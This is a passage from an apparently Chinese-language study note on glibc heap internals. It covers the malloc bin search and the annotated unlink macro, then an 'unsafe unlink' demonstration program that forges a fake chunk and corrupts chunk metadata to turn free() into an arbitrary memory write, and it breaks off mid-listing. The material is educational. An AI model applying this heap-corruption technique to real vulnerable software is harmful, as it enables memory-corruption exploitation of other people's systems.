<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">         <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="keyword">do</span></span><br><span class="line">               &#123;</span><br><span class="line">                 <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                   <span class="keyword">goto</span> use_top;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">             bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">             bit = <span class="number">1</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">         <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">           &#123;</span><br><span class="line">             bin = next_bin (bin);</span><br><span class="line">             bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">             assert (bit != <span class="number">0</span>);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">         victim = last (bin);</span><br><span class="line"></span><br><span class="line">         <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">         <span class="keyword">if</span> (victim == bin)</span><br><span class="line">           &#123;</span><br><span class="line">             av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">             bin = next_bin (bin);</span><br><span class="line">             bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">             <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">             assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* unlink */</span></span><br><span class="line">             unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Exhaust */</span></span><br><span class="line">             <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">               &#123;</span><br><span class="line">                 set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                 <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Split */</span></span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               &#123;</span><br><span class="line">                 remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">                 <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                    have to perform a complete insert here.  */</span></span><br><span class="line">                 bck = unsorted_chunks (av);</span><br><span class="line">                 fwd = bck-&gt;fd;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);</span><br><span class="line">                 remainder-&gt;bk = bck;</span><br><span class="line">                 remainder-&gt;fd = fwd;</span><br><span class="line">                 bck-&gt;fd = remainder;</span><br><span class="line">                 fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">                 <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">                 <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                   av-&gt;last_remainder = remainder;</span><br><span class="line">                 <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                   &#123;</span><br><span class="line">                     remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                     remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                 set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                           (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                 set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                 set_foot (remainder, remainder_size);</span><br><span class="line">               &#125;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<p>unlink：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">\</span><br><span class="line">\<span class="comment">/* 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查) */</span>\</span><br><span class="line">    \<span class="comment">/* 1. prev_size 检查 */</span>\</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);            \</span><br><span class="line">    FD = P-&gt;fd;                      \</span><br><span class="line">    BK = P-&gt;bk;                      \</span><br><span class="line">    \</span><br><span class="line">    \<span class="comment">/* 检查 fd 和 bk 指针(双向链表完整性检查) */</span>\</span><br><span class="line">    \<span class="comment">/* 2. 双向链表完整性检查 */</span>\</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))          \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);            \</span><br><span class="line">    <span class="keyword">else</span> &#123;                      \</span><br><span class="line">        FD-&gt;bk = BK;                    \</span><br><span class="line">        BK-&gt;fd = FD;<span class="comment">//把自己解除链接，让自己的前一个和后一个相连                   </span></span><br><span class="line">        </span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))            \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;          \</span><br><span class="line">            \</span><br><span class="line">            \<span class="comment">/* largebin 中 next_size 双向链表完整性检查 */</span>\</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)        \</span><br><span class="line">    || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;              \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)              \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;          \</span><br><span class="line">                <span class="keyword">else</span> &#123;                    \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;            \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;            \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;            \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;            \</span><br><span class="line">                  &#125;                    \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                    \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;          \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;          \</span><br><span class="line">              &#125;                      \</span><br><span class="line">          &#125;                      \</span><br><span class="line">      &#125;                        \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="tcache-unlink-1"><a href="#tcache-unlink-1" class="headerlink" title="tcache_unlink"></a>tcache_unlink</h2><p>代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 20.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//chunk大到不能使用tcache和fastbin</span></span><br><span class="line">	<span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);<span class="comment">//chun0_ptr放在这个地址：0x555555558020, chunk0_ptr里面装着： 0x5555555592a0</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"><span class="comment">//要破坏chunk1</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);<span class="comment">//在chunk0中制作fakechunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;<span class="comment">//chunk0_ptr的值是返回给用户的值，则chunk0_ptr[-1]为头部第二个也就是大小字段。</span></span><br><span class="line">	<span class="comment">//----------————————chunk0 包括头部</span></span><br><span class="line">	<span class="comment">//    |size （431）</span></span><br><span class="line">	<span class="comment">//---------——————fake chunk ptr包括头部|chunk ptr</span></span><br><span class="line">	<span class="comment">//    |size-0x10 （421）</span></span><br><span class="line">	<span class="comment">//---------</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);<span class="comment">//这个[2]指向fake chunk的user data区域，也就是返回给用户的区域，如果空闲态就是fd</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);<span class="comment">//绕过unlink检查</span></span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);<span class="comment">//空闲态的bk</span></span><br><span class="line">	<span class="comment">//fd: 0x0000555555558008	bk: 0x0000555555558010</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);<span class="comment">//控制chunk0的数据可以溢出，直到可以覆盖chunk1</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We shrink （缩小）the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk1_hdr:%p\n&quot;</span>,chunk1_hdr);</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n&quot;</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);<span class="comment">//把chunk1的pre_size改成0x420则我们伪造的fakechunk的开头被认为是chunk1的前一个chunk的开头。</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);<span class="comment">//并且把后面size三位中代表前一个chunk是否为free的标志改为0表示chunk1前一个chunk fakechunk的状态为空闲态。</span></span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);<span class="comment">//当我们free chunk1的时候，它会向前合并，因为物理相邻的chunk为空闲态。</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line">	<span class="comment">//free之前chunk0ptr依然指向fakechunk包括头部的开头</span></span><br><span class="line">	<span class="comment">//free之后指向了fackchunkfd写的内容的那个内容所表示的地址上</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// sanity check</span></span><br><span class="line">	assert(*(<span class="keyword">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//把chunk0摘除使用unlink</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>free(chunk1_ptr)时，glibc发现chunk0是空闲的，就会向后合并。这时需要把chunk0从链表中摘除，就会调用unlink。可以推测，它先做Fd-&gt;bk=Bk,再做Bk-&gt;fd=Fd，也就是chunk0_ptr指针的内容先变成8010，再变成8008。自此，伪造的堆块chunk0，不再被认为位于0x603010，而是位于0x602058。<br><img src="https://i.imgur.com/v5tFgAp.png"></p>
</blockquote>
<p>更改了chunk0_ptr指向的地址。</p>
<p><img src="https://i.imgur.com/rjpAhlB.png"></p>
<p>chunk0_ptr指针指向0x00007fffffffdef0，堆块chunk0被认为位于victim_string指向的地址。假如这里存在恶意代码，或者错误的数据，被当成正常的内容利用，就会有问题。</p>
<blockquote>
<p>把指针变量的地址和它包含的内容进行一个利用</p>
</blockquote>
<h3 id="int-free"><a href="#int-free" class="headerlink" title="int_free():"></a>int_free():</h3><h4 id="free函数的执行内容："><a href="#free函数的执行内容：" class="headerlink" title="free函数的执行内容："></a>free函数的执行内容：</h4><ul>
<li>①判断要释放的chunk是否在fastbin的范围内，如果在就放入fastbin中；否则就放入unsortedbin中</li>
<li>②当放入unsortedbin中时，要检查unlink（前向合并、后向合并）</li>
</ul>
<p><img src="https://pic3.zhimg.com/v2-770e5f98dc3d690d06ed94e5a35873ca_r.jpg"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span 